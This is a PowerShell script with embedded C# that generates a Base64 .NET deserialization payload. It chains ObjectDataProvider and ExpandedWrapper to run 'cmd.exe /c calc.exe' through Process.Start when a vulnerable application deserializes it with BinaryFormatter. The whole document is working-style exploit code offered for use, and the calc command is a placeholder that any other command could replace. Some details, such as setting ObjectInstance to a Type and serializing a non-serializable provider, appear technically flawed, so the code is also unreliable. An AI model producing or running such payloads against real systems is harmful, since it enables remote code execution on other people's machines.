# Load the required assemblies
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Data.Services

# Define the C# payload generator
$csharpCode = @"
using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Data;
using System.Data.Services.Internal;

public class PayloadGenerator
{
    public static string Generate()
    {
        // 1. Create the ObjectDataProvider
        ObjectDataProvider odp = new ObjectDataProvider();
        
        // 2. Set the ObjectInstance to the Process Type (for static method invocation)
        odp.ObjectInstance = typeof(System.Diagnostics.Process);
        
        // 3. Add MethodParameters BEFORE setting MethodName (Order is critical)
        odp.MethodParameters.Add("cmd.exe");
        odp.MethodParameters.Add("/c calc.exe");
        
        // 4. Set the MethodName
        odp.MethodName = "Start";

        // 5. Wrap in ExpandedWrapper to make it serializable
        ExpandedWrapper<ObjectDataProvider, object> wrapper = new ExpandedWrapper<ObjectDataProvider, object>();
        wrapper.ExpandedElement = odp;

        // 6. Serialize to Base64
        BinaryFormatter formatter = new BinaryFormatter();
        using (MemoryStream ms = new MemoryStream())
        {
            formatter.Serialize(ms, wrapper);
            return Convert.ToBase64String(ms.ToArray());
        }
    }
}
"@

# Compile the C# code and execute it
Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies PresentationFramework, System.Data.Services
$base64Payload = [PayloadGenerator]::Generate()

Write-Host "Base64 Payload:"
Write-Host $base64Payload
